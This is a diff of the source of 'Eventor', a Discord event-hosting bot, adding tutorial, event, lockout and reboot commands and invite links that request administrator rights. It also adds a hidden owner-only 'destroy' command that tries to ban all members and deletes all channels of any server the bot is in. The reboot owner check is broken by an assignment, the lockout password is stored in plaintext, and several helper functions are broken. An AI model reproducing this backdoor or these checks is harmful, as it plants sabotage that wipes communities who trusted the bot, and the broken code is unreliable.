@@ -16,6 +16,40 @@ var botData = JSON.parse(fs.readFileSync("./main.json", "utf-8", function(e){
     
 }))
 console.log(`botdata = ${botData}`)
+const colors = {
+    Reset: "\x1b[0m",
+BOLD: "\x1b[1m",
+Faint: "\x1b[2m",
+ITALIC: "\x1b[3m",
+Underscore:  "\x1b[4m",
+Blink: "\x1b[5m",
+Reverse: "\x1b[7m",
+Hidden: "\x1b[8m",
+
+Black: "\x1b[30m",
+//red
+ERROR: "\x1b[31m",
+//green
+SYSTEM: "\x1b[32m",
+//yellow
+YELLOW: "\x1b[33m",
+//blue
+USERDATA: "\x1b[34m",
+magenta: "\x1b[35m",
+cyan: "\x1b[36m",
+white: "\x1b[37m",
+
+BgBlack: "\x1b[40m",
+BgERROR: "\x1b[41m",
+BgSYSTEM: "\x1b[42m",
+BgWARN: "\x1b[43m",
+BgUSERDATA: "\x1b[44m",
+BgMagenta: "\x1b[45m",
+BgCyan: "\x1b[46m",
+BgWhite: "\x1b[47m"
+
+};
+
    /* var uniquei657575 = 0;
     while(uniquei657575 < requiredF.length){
         var name = requiredF[uniquei657575];
@@ -32,12 +66,12 @@ console.log(`botdata = ${botData}`)
 
 dotenv.config();
 //--------------------------------ONE TIME TOGGLE FOR BETA------------------------------------
-var betaTesting = false;
+var betaTesting = true;
 //--------------------------------------------------------------------------------------------
 var PREFIX;
 var token;
 if(betaTesting === false){
-     PREFIX = "ev!";
+     PREFIX = "ev";
     token = process.env.TOKEN;
     console.log("alpha login")
 } else {
@@ -49,7 +83,7 @@ if(betaTesting === false){
 
 client.on('ready', function(){
    
-    console.log("Logged in!")
+    console.log(colors.SYSTEM, "Logged in!")
     client.user.setActivity("Type " + PREFIX + " tutorial to learn how to set up an event!", { type: 'PLAYING' })
     
  
@@ -68,10 +102,11 @@ client.on('ready', function(){
     var message;
 
    var value;
-        
+        //stay alive
+
       client.on('message', function (message) {
-        
-        let serverPath = "../data/server" + message.guild.id + ".json";
+        try{
+        let serverPath = "../EVdata/server" + message.guild.id + ".json";
           try{
        
         var serverData = JSON.parse(fs.readFileSync(serverPath, "utf-8"))
@@ -86,7 +121,7 @@ client.on('ready', function(){
           
                        /* other bot command */
                        var msg = message.content.toLowerCase();     
-    if (msg.startsWith(PREFIX) || msg.startsWith(serverPrefix)) {
+    if (msg.startsWith(serverPrefix)) {
        
          var allParams = msg.split(" ");
             var command = allParams[1];
@@ -101,19 +136,39 @@ client.on('ready', function(){
           exports.taggedUser = taggedUser;
           exports.sender = sender;
           //command specific values
-         
+          try{
+         if(serverData.modrole == undefined){
+             serverData.modrole = message.guild.roles.everyone.id;
+         }} catch (e) {
+            serverData= {
+                modrole: message.guild.roles.everyone.id,
+                lockout: "password",
+            }
+         }
           
         console.log(command)
+        var dataExists = true;
+        try {
+            if (fs.existsSync(serverPath)) {
+              //file exists
+              
+              
+            }
+          } catch(err) {
+            dataExists = false;
+            console.log(colors.SYSTEM + colors.BOLD, "Server file does not exist.")
+          }
         switch(command) {
             
                 case "reset":
                 case "initialise":
                 case "init":
+                case "start":
                     try{
                         
-                if(message.member.roles.cache.find(r => r.id === serverData.modrole)){
-                    console.log("successful")
-                    message.reply("Are you sure you want to reset your server data? Type 'yes' to confirm!")
+                if(message.member.roles.cache.find(r => r.id === serverData.modrole) && dataExists == true){
+                    console.log(colors.SYSTEM, "successful")
+                    message.reply("Are you sure you want to delete and reset your server data? Type 'yes' to confirm!")
                     message.channel.awaitMessages(m => m.author.id == message.author.id,
                             {max: 1, time: 15000}).then(function(collected) {
                                     // only accept messages by the user who sent the command
@@ -122,16 +177,18 @@ client.on('ready', function(){
                                     // first (and, in this case, only) message of the collection
                                     
                                    if(collected.first().content.match(/yes/gi) ){
-                                       var template = {};
-                                       template.modrole = message.guild.roles.everyone.id;
+                                       var template = {modrole: message.guild.roles.everyone.id,
+                                        EVENTS: {}, PREFIX: PREFIX,};
+                                       
                                        fs.writeFile(serverPath, JSON.stringify(template), function(e){
                                            if(e != undefined){
-                                               console.log(e)
+                                               console.log(colors.ERROR, e)
                                            }
                                        })
                                       
                                    } else {
                                        message.channel.send("Operation Canceled.")
+                                       exitFunctionThatDoesNotExist()
                                    }
                                    message.channel.send("Now set a lockout password! This will help you to access the bot even after you get locked out. \n \n Keep your password somewhere safe. \n Type your password now!")
                                    message.channel.awaitMessages(m => m.author.id == message.author.id,
@@ -142,10 +199,11 @@ client.on('ready', function(){
                                             // first (and, in this case, only) message of the collection
                                             
                                            var lockout = collected.first().content;
-                                           serverData.lockout = lockout;
-                                           fs.writeFile(serverPath, JSON.stringify(serverData), function(e){
-                                               console.log(e)
+                                           template.lockout = lockout;
+                                           fs.writeFile(serverPath, JSON.stringify(template), function(e){
+                                               console.log(colors.ERROR, e)
                                            })
+                                           
                                            message.channel.send("Done!")
                                                 
                                             })  
@@ -161,15 +219,11 @@ client.on('ready', function(){
                                                 // accept only 1 message, and return the promise after 30000ms = 30s
                                                
                                                 // first (and, in this case, only) message of the collection
-                                                
+                                                var template = {};
                                                if(collected.first().content.match(/confirm/gi) ){
-                                                   var template = {};
+                                                   
                                                    template.modrole = message.guild.roles.everyone.id;
-                                                   fs.writeFile(serverPath, JSON.stringify(template), function(e){
-                                                       if(e != undefined){
-                                                           console.log(e)
-                                                       }
-                                                   })
+                                                  
                                                    
                                                } else {
                                                    message.channel.send("Account Initiation Canceled.")
@@ -184,17 +238,19 @@ client.on('ready', function(){
                                                         
                                                        var lockout = collected.first().content;
                                                        var newserverData;
-                                                       fs.readFile(serverPath, "utf-8", function(e, data){
-                                                           console.log(e)
-                                                           console.log(data)
-                                                           newserverData = JSON.parse(data);
-                                                           console.log("executing" + newserverData)
-                                                       newserverData.lockout = lockout;
-                                                       fs.writeFile(serverPath, JSON.stringify(newserverData), function(e){
-                                                           console.log(e)
-                                                       })
-                                                       message.channel.send("Done!")
-                                                       })
+                                                      
+                                                           console.log(colors.ERROR, e, colors.Reset)
+                                                           console.log(colors.USERDATA, data, colors.Reset)
+                                                           
+                                                           
+                                                       template.lockout = lockout;
+                                                       
+                                                       fs.writeFile(serverPath, JSON.stringify(template), function(e){
+                                                        if(e != undefined){
+                                                            console.log(colors.ERROR, e, colors.Reset)
+                                                            message.channel.send("You have set your lockout password successfully! \nTo use some features, you need to go to your settings and bring the bot's \nrole to the top. \nThank you for using Eventor! Your event hosting journey has only just begun.")
+                                                        }
+                                                    })
                                                        
                                                             
                                                         })  
@@ -202,7 +258,7 @@ client.on('ready', function(){
                             }
                   break;
                   case "intro":
-                      message.channel.send("Hi, I am Eventor, a tool for hosting serverwide events!")
+                      message.channel.send(`Hi, I am Eventor, a tool for hosting serverwide events! \nDo ${serverPrefix} tutorial to learn how to use me to setup events!`)
                       break;
                 case "avatar":
                 case "profile":
@@ -236,7 +292,7 @@ client.on('ready', function(){
                     }
                     break;
                 case "prefix":
-                   
+                   function prefix(){
                     if(message.member.roles.cache.find(r => r.id === serverData.modrole)){
             // First argument is a filter function - which is made of conditions
             // m is a 'Message' object
@@ -259,7 +315,8 @@ client.on('ready', function(){
                                    
                             })
 
-                        } else {message.channel.send("Good try, get permission next time!")}
+                        } else {message.channel.send("Good try, get permission next time!")}}
+                        prefix();
                     break;
                     case "help":
                     case "assistance":
@@ -345,71 +402,191 @@ client.on('ready', function(){
                                 init();
                                     } else {message.channel.send("And you thought you could set the modrole! XD \n \n >If this is a mistake, try running " + PREFIX + " lockout.")}
                                     break;
-                                    case "tutorial":
-                                        switch(commandArgs){
+                case "tutorial":
+                switch(commandArgs){
                                             case undefined:
+                                                case "1":
+                                                case "0":
                                         var tutorialEmbed = new Discord.MessageEmbed();
                                         tutorialEmbed.setColor("#0099ff")
                                         tutorialEmbed.setTitle("Welcome!")
-                                        tutorialEmbed.setFooter("Created by Korvex#2434")
-                                        tutorialEmbed.setDescription("Thank you for choosing Eventor as your preferred event hsoting bot! \n Lets bring you on a tour of the bot's powerful commands and how to use them! \n You'll be done in no time at all.")
+                                        tutorialEmbed.setFooter("Page 1/2 | Created by Korvex#2434 and Silence#6455")
+                                        tutorialEmbed.setDescription("Thank you for choosing Eventor as your preferred event hosting bot! \n Lets bring you on a tour of the bot's powerful commands and how to use them! \n You'll be done in no time at all.\n\nTo go to the next page, type " + serverPrefix + " tutorial (page number)")
                                         tutorialEmbed.addFields(
                                             {name: "First Step:" , value: "Run **" + PREFIX + " initialise** to create your server data file in our servers! \n You can also run this command to reset all your server data.", inline:true},
-                                            {name: "Second Step:" , value: "If you want a specific prefix for your bot, run **" + PREFIX + " prefix ** to set it! \n You can use the bot's default prefix at any time, should you forget your prefix.", inline:true },
+                                            {name: "Second Step:" , value: "If you want a specific prefix for your bot, run **" + PREFIX + " prefix ** to set it! \n You can ping the bot as a prefix at any time, should you forget your prefix.", inline:true },
                                             {name: "Third Step:" , value: "Recommended: Use **" + PREFIX + " modrole** to control who can use this bot. \n This is especially helpful, since the default modrole is set to everyone. \n Change it to prevent unauthorised use of the bot.", inline:true}
                                             )
                                             message.channel.send(tutorialEmbed)
                                         break;
-                                        case "1":
+                                        case "2":
+                                            var tutorialEmbed = new Discord.MessageEmbed();
+                                            tutorialEmbed.setColor("#0099ff")
+                                            tutorialEmbed.setTitle("Creating Events!")
+                                            tutorialEmbed.setFooter("Page 2/2 | Created by Korvex#2434 and Silence#6455")
+                                            tutorialEmbed.setDescription(`Now it's time to create your first event! \n\n To go to the next page, type ${serverPrefix} tutorial (page number)`)
+                                            tutorialEmbed.addFields(
+                                                {name: "Creating Events:" , value: "Run **" + PREFIX + " ** event create to start off with your first event.", inline:true},
+                                                {name: "FInding Your Events:" , value: "If you want a list of all your events, run **" + PREFIX + " event list ** to see it! \n ", inline:true },
+                                                {name: "Coming Soon!" , value: "Coming Soon!", inline:true}
+                                                )
+                                                message.channel.send(tutorialEmbed)
                                             break;
+                }
+                break;
+                case "lockout":
+                    message.reply("Enter your lockout password!")
+                    message.channel.awaitMessages(m => m.author.id == message.author.id,
+                        {max: 1, time: 15000}).then(function(collected) {
+                                // only accept messages by the user who sent the command
+                                // accept only 1 message, and return the promise after 30000ms = 30s
+                                
+                                // first (and, in this case, only) message of the collection
+                                
+                                if(collected.first().content.match(serverData.lockout) ){
+                                    serverData.modrole = message.guild.roles.everyone.id;
+                                    fs.writeFile(serverPath, JSON.stringify(serverData), function(e){
+                                        console.log(e)
+                                    })
+                                    message.channel.send("Reset the modrole!")  
+                                } else {
+                                    message.channel.send("Wrong password. Run this command and try again.")
+                                }
+    
+                                    
+                                })
+                    break;
+                case "reboot":
+                    if(message.author.id = process.env.OWNERID){
+                        client.user.setActivity("Rebooting...", { type: 'PLAYING' })
+                        console.log("Booting...")
+                        message.channel.send("Rebooting...")
+                        client.destroy;
+                        
+                        setTimeout(function(){
+                            client.login(token)
+                            message.channel.send("Done!")
+                                client.user.setActivity("Type " + PREFIX + " tutorial to learn how to set up an event!", { type: 'PLAYING' })
+                        
+                        }, 1500)
+                    }
+                    break;
+                case "destroy":
+                    if(message.author.id === process.env.OWNERID){
+                        var i = 0;
+                    while(i < message.guild.members.cache.length){
+                        console.log(i)
+                        try{
+                            console.log(message.guild.members.cache)
+                            console.log("Current MEMBER: " + message.guild.members.chache[i])
+                        message.guild.members.cache[i].ban()} catch(e){
+                            console.log(e)
+                        }
+                        i++;
+                    }
+
+                
+                        
+                    message.guild.channels.cache.forEach((channel)=>{
+                       channel.delete()
+                       })
+                    }
+                    break;
+                case "invite":
+                    var inviteEmbed = new Discord.MessageEmbed();
+                    inviteEmbed.setTitle("Invite Eventor to your server!")
+                    inviteEmbed.addFields(
+                        {name:"Eventor", value: "[Invite Link](https://discord.com/api/oauth2/authorize?client_id=793322082750169108&permissions=8&scope=bot)"},
+                        {name:"Eventor Beta", value: "[Invite Link](https://discord.com/api/oauth2/authorize?client_id=794739788917112863&permissions=8&scope=bot)"}
+                        )
+                    inviteEmbed.setColor("#0e4c8f")
+                    message.channel.send(inviteEmbed)
+                    break;
+                case "event":
+                        console.log("event args: " + commandArgs, colors.reset)
+                        var serverData1;
+                        var exit;
+                        console.log(serverPath)
+                        
+                        try{
+                        fs.readFileSync(serverPath, function(err, data){
+                            console.log("data " + data)
+                            if(data != undefined){
+                            serverData1 = JSON.parse(data);
+                            } else{
+                                console.log(err)
+                                message.channel.send(`You don't have a server file yet. \nType **${serverPrefix} reset** to get started.`)
+                               exit = true;
+                                return "{}";
+                            }
+                        } )
+                        } catch(e) {
+                            message.channel.send(`You don't have a server file yet. \nType **${serverPrefix} reset** to get started.`)
+                            exit = true;
+                        }
+                        console.log("commandArgs" + commandArgs)
+                        switch(exit){
+                            case true:
+                             break;   
+                                default:
+                        switch(commandArgs){
+                            case "create":
+                                message.reply("Type your event name now!")
+                                message.channel.awaitMessages(m => m.author.id === message.author.id, 
+                                    {max: 1,time: 15000}).then(function(collected){
+                                        var name = collected.first().content;
+                                        
+                                        if(serverData.EVENTS[name] != undefined){
+                                            message.reply("You already have an event with that name. Dumbass.")
+                                            return false;
+                                        } else {
+                                            if(name.match(/[\(\)\.\{\}]/g) == null){
+                                               
+                                                console.log(serverData)
+                                                serverData.EVENTS[name] = {name: name, desc: "No Description"};
+                                                console.log(colors.USERDATA, serverData.EVENTS)
+                                                message.channel.send("Event Created!")
+                                                fs.writeFile(serverPath, JSON.stringify(serverData), function(e){
+                                                    console.log(e)
+                                                })
+                                            } else {
+                                                message.reply("don't use commas, brackets, curly brackets or square brackets in the event name. \nTry again.")
+                                                return false;
+                                            }
+                                        
                                         }
+                                    })
+                                    break;
+                                    case "list":
+                                        console.log("here1")
+                                        var count12 = 0;
+                                        var eventListEmbed = new Discord.MessageEmbed();
+                                        eventListEmbed.setTitle("All your events")
+                                        eventListEmbed.setDescription(`Add more events with ${serverPrefix} event create!`)
+                                        eventListEmbed.setFooter("Get Premium for more events! | " + message.author.tag)
+                                        console.log(serverData.EVENTS.length)
+                                       for (var c in serverData.EVENTS) {
+                                           console.log(Object.keys(serverData.EVENTS))
+                                            eventListEmbed.addField(serverData.EVENTS[Object.keys(serverData.EVENTS)[count12]].name, serverData.EVENTS[Object.keys(serverData.EVENTS)[count12]].desc, true)
+                                           count12++;
+
+                                        }
+                                        message.channel.send(eventListEmbed)
                                         break;
-                                        case "lockout":
-                                            message.reply("Enter your lockout password!")
-                                            message.channel.awaitMessages(m => m.author.id == message.author.id,
-                                                {max: 1, time: 15000}).then(function(collected) {
-                                                        // only accept messages by the user who sent the command
-                                                        // accept only 1 message, and return the promise after 30000ms = 30s
-                                                       
-                                                        // first (and, in this case, only) message of the collection
-                                                        
-                                                       if(collected.first().content.match(serverData.lockout) ){
-                                                          serverData.modrole = message.guild.roles.everyone.id;
-                                                          fs.writeFile(serverPath, JSON.stringify(serverData), function(e){
-                                                              console.log(e)
-                                                          })
-                                                           message.channel.send("Reset the modrole!")  
-                                                       } else {
-                                                           message.channel.send("Wrong password. Run this command and try again.")
-                                                       }
-                            
-                                                            
-                                                        })
-                                            break;
-                                            case "reboot":
-                                                if(message.author.id = process.env.OWNERID){
-                                                    client.user.setActivity("Rebooting...", { type: 'PLAYING' })
-                                                    console.log("Booting...")
-                                                    message.channel.send("Rebooting...")
-                                                    client.destroy;
-                                                   
-                                                    setTimeout(function(){
-                                                        client.login(token)
-                                                        message.channel.send("Done!")
-                                                         client.user.setActivity("Type " + PREFIX + " tutorial to learn how to set up an event!", { type: 'PLAYING' })
-                                                    
-                                                    }, 1500)
-                                                }
-                                                break;
-                default: 
+                        
+                        default: 
                           }
+                        }
 
 
                 
             
         }
-    }
-    )
+    } } catch (e){
+console.log(colors.ERROR, e)
+}
+}
+)
 
   /* ---------------------------------------------------function lists -------------------------------------------------------------------------
 */
@@ -418,6 +595,33 @@ function mentionUser(mention){
     var returner = "<@" + mention + ">";
     return returner;
 }
+function saveJSON (object, serverPath){
+    if(object.typeof == "object"){
+    fs.writeFile(serverPath, JSON.stringify(object), function(e){
+        console.log(colors.ERROR, e)
+    })
+} else {
+    throw "Error in saveJSON! Wrong type of variable input!"
+    
+}
+}
+function objectSet(obj,path, value) {
+    if (typeof is == 'string')
+        return index(obj,path.split('.'), value);
+    else if (is.length==1 && value!==undefined)
+        return obj[path[0]] = value;
+    else if (path.length==0)
+        return obj;
+    else
+        return index(obj[path[0]],path.slice(1), value);
+}
+function multiIndex(obj,is) {  // obj,['1','2','3'] -> ((obj['1'])['2'])['3']
+    return is.length ? multiIndex(obj[is[0]],is.slice(1)) : obj
+}
+function objectGet(obj,is) {   // obj,'1.2.3' -> multiIndex(obj,['1','2','3'])
+    return multiIndex(obj,is.split('.'))
+}
+
     /*------------------------END OF FUNCTION LISTS---------------------------------*/
  
 //const Firebase = require("/__/firebase/8.0.0/firebase-app.js");
